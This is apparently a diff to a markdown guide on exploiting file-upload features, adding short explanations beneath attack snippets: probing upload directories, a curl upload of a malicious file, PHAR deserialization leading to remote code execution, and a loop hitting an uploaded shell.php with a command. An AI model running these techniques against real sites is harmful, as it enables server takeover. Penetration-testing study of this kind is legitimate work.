@@ -58,6 +58,7 @@ for d in uploads upload files attachments avatars profile_images images media do
   echo "/$d/ → $code"
 done
 ```
+> Probes common upload directory names. A 200 or 403 response means the directory exists. A 404 means it doesn't. A 200 with content means directory listing is enabled.
 
 ### Method 2 — Force error messages
 - Upload a file with the **same name** as an existing one
@@ -164,6 +165,7 @@ curl -X POST "http://TARGET/upload" -F "file=@malicious.jpg"
 # Later: ANY function that does file_exists/fopen/is_file on phar://uploads/image.jpg
 # triggers deserialization → RCE
 ```
+> Builds a malicious PHP Archive (PHAR) file containing a serialized object with a dangerous `__destruct` or `__wakeup` method. Uploading it as an image disguises it. Any PHP file operation on a `phar://` path triggers deserialization and code execution.
 
 Triggers on functions you'd never expect: `file_exists()`, `fopen()`, `getimagesize()`, `imagecreatefromstring()`, even `unlink()`.
 
@@ -186,6 +188,7 @@ Solution: send the upload, then immediately curl the file in a tight loop:
 ```bash
 while true; do curl -s "http://TARGET/uploads/shell.php?c=id" | grep uid && break; done
 ```
+> Races the server's validation by requesting the uploaded file repeatedly until code execution succeeds. The loop breaks as soon as `uid=` appears in the response, confirming the file ran before deletion.
 
 ---
 
